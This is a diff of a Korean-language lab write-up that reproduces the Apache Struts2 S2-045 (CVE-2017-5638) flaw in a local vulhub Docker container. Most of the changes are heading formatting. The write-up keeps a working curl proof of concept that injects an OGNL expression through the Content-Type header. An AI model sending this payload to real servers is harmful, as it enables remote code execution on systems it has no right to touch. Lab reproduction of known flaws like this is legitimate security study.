@@ -8,8 +8,7 @@
 - Docker Version: 28.0.4
 - Docker Compose Version: 2.34.0
 
-3. 실습 과정
-
+## 3. 실습 과경
 3.1. 취약한 환경 구성
 먼저 vulhub 레포지터리를 클론하고, Struts2 s2-045 취약 버전이 설정된 디렉터리로 이동했다. 이후 docker-compose를 이용해 컨테이너를 띄웠다.
 
@@ -23,14 +22,12 @@ docker compose up -d
 3.2. 환경 구축 결과
 컨테이너가 정상적으로 올라가면서 Struts2 쇼케이스 페이지가 동작하는 것을 확인했다.
 
-4. 취약점 검증 (PoC)
+## 4. 취약점 검증 (PoC)
 4.1. 공격 시도
 curl 명령어를 이용해 Content-Type 헤더에 OGNL 표현식을 삽입해 요청을 보냈다.
 
-bash
-복사
-편집
 curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action
+
 (여기에 [PoC 성공 캡처] 삽입 예정)
 
 4.2. 결과 확인
@@ -41,7 +38,6 @@ curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext
 
 6. 참고 자료
 Vulhub Struts2 S2-045 환경
-
 CVE-2017-5638 상세정보 - NVD
 
 7. GitHub 레포 링크
